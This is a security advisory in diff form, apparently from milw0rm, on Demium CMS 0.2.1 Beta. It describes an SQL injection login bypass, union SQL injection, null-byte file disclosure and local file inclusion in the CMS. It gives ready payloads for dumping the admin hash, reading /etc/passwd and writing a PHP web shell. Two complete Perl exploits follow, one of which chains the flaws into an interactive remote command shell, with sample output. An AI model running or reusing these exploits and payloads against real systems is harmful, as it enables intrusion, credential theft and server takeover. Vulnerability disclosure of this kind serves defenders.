@@ -1,0 +1,450 @@
+Demium CMS, version 0.2.1 Beta, is prone to multiple remote vulnerabilities, because of insufficient security on it. Let's see them. In this advisory
+you can find vulnerabilities, afflicted source, and multiple Remote Exploit.
+
+
+Credits to : Giovanni Buzzin, Osirys
+Contact    : osirys[at]autistici[dot]org
+Website    : http://osirys.org
+Download   : http://www.demium.de/ftp/archive/demium_beta_v.0.2.1.rar
+
+
+[0x01 - Authority Bypass via Sql Injection]
+
+	At first, it's vulnerable to Authority Bypass via Sql Injection. Needs Magic Quotes OFF to work, because CMS dosn't stripslash on
+	POST data.
+	
+	Vulnerable file is: /[path]/index_admin.php
+	[CODE]
+		$username = $_POST['user'];
+		$pw = md5($_POST['pw']);
+		$sql = "SELECT * FROM cms_profile WHERE profile_username = '$username' AND profile_password = '$pw' AND profile_aktiv=1;";
+		$result = mysql_query($sql);
+		$failure=true;
+		while($row = mysql_fetch_assoc($result))
+			{
+			$failure=false;
+			setcookie("login_pw", $pw, (time()+(60*60*24*365)));
+			setcookie("login_user", $username, (time()+(60*60*24*365)));
+			header("Location: /demium_beta_v.0.2.1//index_admin.php?loading=1");
+			}
+		}
+	[/CODE]
+
+	To exploit this vulnerability, and become Administrator, just put this in username form: admin_user' or '1=1
+	Where admin_user is the real nickname of the Administrator, by default: admin.
+
+[/0x01]
+
+[0x02 - Remote SQL Injection]
+
+	Multiple SQL Injection vulnerabilities found on this CMS. I just report the first one that I found. Needs Magic Quotes needs to be OFF
+        because this CMS doesn't stripslash on GET incoming data.
+
+	Vulnerable file is: /[path]/tracking.php
+	[CODE]
+
+		<?php
+		### Kat-Tracking ###
+		$follow=$_GET['follow_kat'];
+		$check=FALSE;
+		include('config/db_file.php');
+		include('logging/tracking.php');
+
+		$sql="SELECT tracking_kat_target FROM cms_tracking_kat WHERE tracking_kat_id='$follow';";
+		$result=mysql_query($sql);
+		while($row=mysql_fetch_assoc($result))
+			{
+			$check=TRUE;
+		// code
+		if($check==TRUE)
+			{
+			?>
+			<script language="javascript">
+				window.setTimeout("location.replace('<?php echo $target; ?>')","0");
+			</script>
+			<?php
+			}
+
+	[/CODE]
+
+	$follow comes directly from GET, and it's put in the SQL query without been sanized or filtered. If the SQL query is TRUE, rows will
+	be printed on the url.
+
+	Exploit to obtain admin's password: /[path]/tracking.php?follow_kat=osirys' union select concat(profile_username,0x3a,profile_password) from cms_profile order by '*
+	Exploit to create a shell:          /[path]/tracking.php?follow_kat=osirys' union select '<?php system($_GET[cmd]); ?>' into outfile '/tmp/sh_spawn_ownz.txt
+
+	Exploit #1 will produce a GET request to a non existing file, since after the exploit the remote user will be redirected to host/sql_output/.html
+	Testing this SQL Injection in local I got redirected to this URL: http://localhost/admin:5f4dcc3b5aa765d61d8327deb882cf99/.html , producing the classic:
+	The requested URL /admin:5f4dcc3b5aa765d61d8327deb882cf99/.html was not found on this server.
+
+	Exploit #2 just create a file called "sh_spawn_ownz.txt" with "<?php system($_GET[cmd]); ?>" as content, yes, a Remote Shell. With LFI vulnerability the remote user will
+	be able to include the created file and executes command.
+
+	Exploit provided at the end of the adviosory.
+
+
+[/0x02]
+
+[0x03 - Remote File Disclosure]
+
+	It's also vulnerable to File Disclore, with a GET request a remote user is able to read files content. It's not a file inclusion, but a fread
+	of a local file. Let's see the vulnerable code.
+
+	Vulnerable file is: /[path]/urheber.php
+	[CODE]
+		<?php
+		$fname=$_GET['name'];
+		if($handle = @fopen("template/".$fname."/agb.cff", "r"))
+			{
+			$contents = fread ($handle, filesize ("template/".$fname."/agb.cff"));
+			$contents = str_replace("\n", "<br>", $contents);
+			echo $contents;
+			}
+		// Other code
+	[/CODE]
+
+	$fname comes directly from GET, without been cheeked before. From get we can se it's value, and adding a NULL BYTE %00 a remote user will
+	be able to read the content of the selected file.
+	Attach example: /[path]/urheber.php?name=../content.php%00
+        This request will show /[path]/content.php source code.
+        Attach example #2 : /[path]/urheber.php?name=../../../../../../../../../../etc/passwd%00
+
+[/0x03]
+
+[0x04 - Local File Inclusion]
+
+	This CMS, it's also affected to Local File Inclusion, a remote user will able to include and execute local file on the server.
+	I coded then a simple exploit to obtain a Remote Command Execution, creating a malicious file on the server, to include it then with the LFI.
+
+	Vulnerable file is: /[path]/content.php
+	[CODE]
+		<?php
+		include('config/db_file.php');
+		include('config/rights.php');
+		$include = "overview";
+		if($_GET['include'])
+			$include = $_GET['include'];
+		if($_COOKIE['login_user'] && $_COOKIE['login_pw'])
+		@include('modules/'.$include.'.php');
+		?>
+	[/CODE]
+
+	In case of remote user's user and password cookies, the script will include GET data, simple Perl sploit at the end of the advisory.
+
+[/0x04]
+
+
+
+#########
+Exploits section now.
+####
+
+
+[$$ - Local File Inclusion Exploit]
+
+#!/usr/bin/perl
+
+# LFI Sploit
+# by Osirys
+
+use IO::Socket;
+
+my $host   = $ARGV[0];
+
+($host) || help("-1");
+cheek($host) == 1 || help("-2");
+&banner;
+
+$datas = get_input($host);
+$datas =~ /(.*) (.*)/;
+($h0st,$path) = ($1,$2);
+
+&exploit;
+
+sub exploit () {
+    print "\n[*] Include: ";
+    chomp($l_file = <STDIN>);
+
+    print "\n";
+    $l_file !~ /exit/ || die "Exiting ..";
+    if ($l_file !~ /%00^/) {
+        $l_file = $l_file."%00";
+    }
+
+    my $url = $path."/content.php?include=".$l_file;
+
+    my $data = "GET ".$url." HTTP/1.1\r\n".
+               "Host: ".$h0st."\r\n".
+               "Keep-Alive: 300\r\n".
+               "Connection: keep-alive\r\n".
+               "Content-Type: application/x-www-form-urlencoded\r\n".
+               "Cookie: login_user=p0wnin; login_pw=p0wnin\r\n".
+               "Content-Length: 0\r\n\r\n".
+               "\r\n";
+
+    my $socket   =  new IO::Socket::INET(
+                                             PeerAddr => $h0st,
+                                             PeerPort => '80',
+                                             Proto    => 'tcp',
+                                        ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";
+
+    $socket->send($data);
+
+    my $count = 0;
+    while (my $e = <$socket>) {
+        $count++;
+        if ($count > 9) {
+            chomp($e);
+            print "$e\n";
+        }
+    }
+
+    &exploit;
+}
+
+sub cheek() {
+    my $host = $_[0];
+    if ($host =~ /http:\/\/(.+)/) {
+        return 1;
+    }
+    else {
+        return 0;
+    }
+}
+
+sub get_input() {
+    my $host = $_[0];
+    $host =~ /http:\/\/(.+)/;
+    $s_host = $1;
+    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
+    ($h0st,$path) = ($1,$2);
+    $path =~ s/(.*)/\/$1/;
+    $full_det = $h0st." ".$path;
+    return $full_det;
+}
+
+sub banner {
+    print "\n".
+          "  --------------------------- \n".
+          "     Demium CMS LFI sploit    \n".
+          "           by Osirys          \n".
+          "  --------------------------- \n\n";
+}
+
+sub help () {
+    my $error = $_[0];
+    if ($error == -1) {
+        &banner;
+        print "\n[-] Bad hostname! \n";
+    }
+    elsif ($error == -2) {
+        &banner;
+        print "\n[-] Bad hostname address !\n";
+    }
+    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
+    exit(0);
+}
+
+[/$$]
+
+
+
+
+
+
+
+[$$$ - Remote Command Execution Exploit via SQL Injection and Local File Inclusion (Works with mq Off)]
+
+#!/usr/bin/perl
+
+# RCE Exploit
+# Step 1 => Creating a remote Shell in /tmp via SQL Injection
+# Step 2 => Including via LFI remote Shell, executing your CMDs
+
+# by Giovanni Buzzin, Osirys
+
+# ----------------------------------------------------------------------------
+# Exploit in action [>!]
+# ----------------------------------------------------------------------------
+# osirys[~]>$ perl sp1.txt http://localhost/demium_beta_v.0.2.1/
+
+#   ---------------------------
+#      Demium CMS RCE sploit
+#            (SQL-LFI)
+#            by Osirys
+#   ---------------------------
+
+# [*] Getting admin login details ..
+# [$] User: admin
+# [$] Pass: 5f4dcc3b5aa765d61d8327deb882cf99
+
+# [*] Creating remote Shell via SQL Injection ..
+# [*] Spawning remote Shell via LFI ..
+
+# shell[localhost]$> id
+# uid=80(apache) gid=80(apache) groups=80(apache)
+# shell[localhost]$> pwd
+# /home/osirys/web/demium_beta_v.0.2.1
+# shell[localhost]$> exit
+# [-] Quitting ..
+
+# osirys[~]>$
+# ----------------------------------------------------------------------------
+
+use IO::Socket;
+use LWP::UserAgent;
+
+my $host   = $ARGV[0];
+my $rand = int(rand 50);
+
+($host) || help("-1");
+cheek($host) == 1 || help("-2");
+&banner;
+
+$datas = get_input($host);
+$datas =~ /(.*) (.*)/;
+($h0st,$path) = ($1,$2);
+
+print "[*] Getting admin login details ..\n";
+
+my $url = $host."/tracking.php?follow_kat=osirys' union select concat(profile_username,0x3a,profile_password) from cms_profile order by '*";
+my $re = get_req($url);
+if ($re =~ /replace\('\/(.+):(.+)\/.html/) {
+    $user = $1;
+    $pass = $2;
+    print "[\$] User: $user\n";
+    print "[\$] Pass: $pass\n";
+}
+else {
+    print "[-] Can't extract admin details\n\n";
+}
+
+print "\n[*] Creating remote Shell via SQL Injection ..\n";
+
+my $code = "<?php echo \"0xExec\";system(\$_GET[cmd]);echo \"ExeCx0\" ?>";
+my $file = "/tmp/sh_spawn_ownzzzzz".$rand.".txt";
+my $attack  = $host."/tracking.php?follow_kat=osirys' union select '".$code."' into outfile '".$file;
+get_req($attack);
+
+print "[*] Spawning remote Shell via LFI ..\n\n";
+&exploit;
+
+sub exploit {
+    my $file = "../../../../../../../../..".$file;
+    $h0st !~ /www\./ || $h0st =~ s/www\.//;
+    print "shell[$h0st]\$> ";
+    chomp($cmd = <STDIN>);
+    $cmd !~ /exit/ || die "[-] Quitting ..\n\n";
+
+    my $url = $path."/content.php?include=".$file."%00&cmd=".$cmd;
+
+    my $data = "GET ".$url." HTTP/1.1\r\n".
+               "Host: ".$h0st."\r\n".
+               "Keep-Alive: 300\r\n".
+               "Connection: keep-alive\r\n".
+               "Content-Type: application/x-www-form-urlencoded\r\n".
+               "Cookie: login_user=p0wnin; login_pw=p0wnin\r\n".
+               "Content-Length: 0\r\n\r\n".
+               "\r\n";
+
+    my $socket   =  new IO::Socket::INET(
+                                             PeerAddr => $h0st,
+                                             PeerPort => '80',
+                                             Proto    => 'tcp',
+                                        ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";
+
+    $socket->send($data);
+
+    my @tmp_out;
+    my $stop;
+    while ((my $e = <$socket>)&&($stop != 1)) {
+        if ($e =~ /ExeCx0/) {
+            $stop = 1;
+        }
+        push(@tmp_out,$e);
+    }
+
+    $stop == 1 || die "[-] Can't include remote Shell\n\n";
+
+    my $re = join '', @tmp_out;
+    my $content = tag($re);
+    if ($content =~ /0xExec(.+)\*ExeCx0/) {
+        my $out = $1;
+        $out =~ s/\$/ /g;
+        $out =~ s/\*/\n/g;
+        chomp($out);
+        print "$out\n";
+        &exploit;
+    }
+    else {
+        $c++;
+        $cmd =~ s/\n//;
+        print "bash: ".$cmd.": command not found\n";
+        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
+        &exploit;
+    }
+}
+
+sub get_req() {
+    $link = $_[0];
+    my $req = HTTP::Request->new(GET => $link);
+    my $ua = LWP::UserAgent->new();
+    $ua->timeout(4);
+    my $response = $ua->request($req);
+    return($response->content);
+}
+
+sub cheek() {
+    my $host = $_[0];
+    if ($host =~ /http:\/\/(.+)/) {
+        return 1;
+    }
+    else {
+        return 0;
+    }
+}
+
+sub get_input() {
+    my $host = $_[0];
+    $host =~ /http:\/\/(.+)/;
+    $s_host = $1;
+    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
+    ($h0st,$path) = ($1,$2);
+    $path =~ s/(.*)/\/$1/;
+    $full_det = $h0st." ".$path;
+    return($full_det);
+}
+
+sub tag() {
+    my $string = $_[0];
+    $string =~ s/ /\$/g;
+    $string =~ s/\s/\*/g;
+    return($string);
+}
+
+sub banner {
+    print "\n".
+          "  --------------------------- \n".
+          "     Demium CMS RCE sploit    \n".
+          "           (SQL-LFI)          \n".
+          "           by Osirys          \n".
+          "  --------------------------- \n\n";
+}
+
+sub help() {
+    my $error = $_[0];
+    if ($error == -1) {
+        &banner;
+        print "\n[-] Bad hostname! \n";
+    }
+    elsif ($error == -2) {
+        &banner;
+        print "\n[-] Bad hostname address !\n";
+    }
+    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
+    exit(0);
+}
+
+[/$$$]
+
+# milw0rm.com [2009-02-27]
